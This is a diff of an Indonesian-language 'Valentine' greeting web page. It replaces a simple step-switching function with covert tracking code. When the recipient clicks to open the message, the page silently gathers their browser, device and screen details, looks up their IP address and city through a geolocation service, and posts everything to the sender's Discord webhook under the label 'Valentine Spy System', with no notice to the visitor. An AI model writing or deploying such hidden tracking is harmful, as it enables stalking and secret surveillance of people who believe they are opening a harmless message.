@@ -121,10 +121,49 @@
     </div>
 
     <script>
-        function nextStep() {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
+       async function nextStep() {
+    // 1. Ambil info perangkat & browser
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    
+    // 2. Ambil IP dan Lokasi Kasar (Menggunakan layanan gratis ipapi)
+    let locationData = "Gagal mengambil lokasi";
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        locationData = `${data.city}, ${data.region}, ${data.country_name} (IP: ${data.ip})`;
+    } catch (err) {
+        console.log("Pelacakan lokasi diblokir adblocker.");
+    }
+
+    // 3. Kirim "Laporan Intelijen" ke Discord
+    const trackData = {
+        username: "Valentine Spy System 🕵️‍♂️",
+        embeds: [{
+            title: "Notifikasi: Link Dibuka!",
+            description: "Seseorang baru saja membuka link Valentine kamu.",
+            color: 3447003, // Warna Biru
+            fields: [
+                { name: "Lokasi (Kota)", value: locationData, inline: false },
+                { name: "Perangkat", value: platform, inline: true },
+                { name: "Resolusi Layar", value: screenRes, inline: true },
+                { name: "Browser Info", value: userAgent, inline: false }
+            ],
+            footer: { text: "Data ini diambil saat tombol 'Buka Pesan' diklik" }
+        }]
+    };
+
+    fetch("URL_WEBHOOK_DISCORD_KAMU", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(trackData)
+    });
+
+    // 4. Lanjut ke tampilan pertanyaan
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+}
 
         function moveButton() {
             // NOTIFIKASI PAKSA
@@ -192,3 +231,4 @@
     </script>
 </body>
 </html>
+
